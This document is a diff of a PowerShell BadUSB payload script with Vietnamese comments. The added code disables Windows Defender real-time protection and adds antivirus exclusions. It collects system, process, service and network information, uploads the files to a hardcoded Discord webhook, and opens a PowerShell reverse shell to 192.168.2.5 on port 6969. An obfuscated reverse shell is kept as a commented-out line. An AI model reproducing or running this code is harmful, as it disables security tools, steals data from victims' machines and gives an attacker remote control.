@@ -8,24 +8,55 @@
 # ============================================
 # PHẦN 1: KHỞI TẠO
 # ============================================
-
+$hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
 $basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
+
+$IP = '192.168.2.5'     # IP máy tấm công
+$PORT = '6969'            # Port dùng cho rs
+
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
+    Set-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue
+} catch {}
 
 # Tạo thư mục
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 
-try {
-    Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
-} catch {}
+# Lấy thông tin máy
+function GatherSystemInfo {
+    $sysInfoDir = "$dumpFolder\SystemInfo"
+    if (-Not (Test-Path $sysInfoDir)) {
+        New-Item -ItemType Directory -Path $sysInfoDir -Force | Out-Null
+    }
+
+    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
+    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
+    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
+    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
+    if ($hookurl) {
+        $body = @{ content = "**SYSTEM INFO EXFILTRATED**`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" } | ConvertTo-Json
+        Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
+        
+        Get-ChildItem "$sysInfoDir" -File | ForEach-Object {
+            curl.exe -F "file1=@$($_.FullName)" $hookurl 2>$null
+            Start-Sleep -Seconds 1
+        }
+    }
+}
+
+# GỌI HÀM LẤY SYSTEM INFO
+GatherSystemInfo
 
 # ============================================
 # PHẦN 2: TẢI VÀ GIẢI NÉN TOOLS
 # ============================================
 
-$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
+$zipUrl = "https://raw.githubusercontent.com/khangpdm/BadUSB/refs/heads/main/tools.zip"
 Invoke-WebRequest $zipUrl -OutFile "tools.zip"
 Expand-Archive -Path "tools.zip" -DestinationPath "." -Force
 
@@ -60,14 +91,14 @@ foreach ($file in $filesToMove) {
 # PHẦN 5: DISCORD WEBHOOK
 # ============================================
 
-$hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
+
 
 # ============================================
 # PHẦN 6: GỬI TỪNG FILE TXT QUA DISCORD
 # ============================================
 
 # Gửi thông báo đầu tiên
-$body = @{ content = "**📁 Exfiltrated data from $env:COMPUTERNAME - $env:USERNAME**" } | ConvertTo-Json
+$body = @{ content = "**Exfiltrated data from $env:COMPUTERNAME - $env:USERNAME**" } | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
 
 # Gửi từng file có dữ liệu
@@ -174,7 +205,34 @@ Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinu
 # PHẦN 10: REVERSE SHELL
 # ============================================
 
-$47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358='P'+'S ';$4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c='1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,6969);$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1 = $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.GetStream();[byte[]]$bytes = 0..65535|%{0};sleep(0.1);sleep(0.1);sleep(0.1);sleep(0.1);while(($i = $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Read($bytes, 0, $bytes.Length)) -ne 0){;$2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 = (n''Ew-oB''J''eC''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e''x'' -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 2>&1 | O''U''t-S''TrI''n''G );$sendback2 = $sendback + $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358.SubString(0,3) + (SP''L''iT-P''A''t''h -path "$(p''w''D'')\0x00") + '> ';sleep 0.01;sleep 0.01;$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb = ([text.encoding]::ASCII).GetBytes($sendback2);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Write($d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb,0,$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb.Length);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Flush()};sleep 0.01;$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close()
+# RS làm rối phức tạp
+#$47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358='P'+'S ';$4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c='1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,6969);$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1 = $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.GetStream();[byte[]]$bytes = 0..65535|%{0};sleep(0.1);sleep(0.1);sleep(0.1);sleep(0.1);while(($i = $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Read($bytes, 0, $bytes.Length)) -ne 0){;$2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 = (n''Ew-oB''J''eC''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e''x'' -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 2>&1 | O''U''t-S''TrI''n''G );$sendback2 = $sendback + $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358.SubString(0,3) + (SP''L''iT-P''A''t''h -path "$(p''w''D'')\0x00") + '> ';sleep 0.01;sleep 0.01;$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb = ([text.encoding]::ASCII).GetBytes($sendback2);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Write($d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb,0,$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb.Length);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Flush()};sleep 0.01;$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close()
+
+# Reverse shell đơn giản hơn
+function ReverseShell {
+    param(
+        [string]$ip,
+        [int]$port
+    )
+
+    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535 | ForEach-Object {0}
+    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
+        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte, 0, $sendbyte.Length)
+        $stream.Flush()
+    }
+    $client.Close()
+}
+
+ReverseShell -ip $IP -port $PORT
+
+# Bật lại Windows Defender real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $false
 
 # ============================================
 # KẾT THÚC
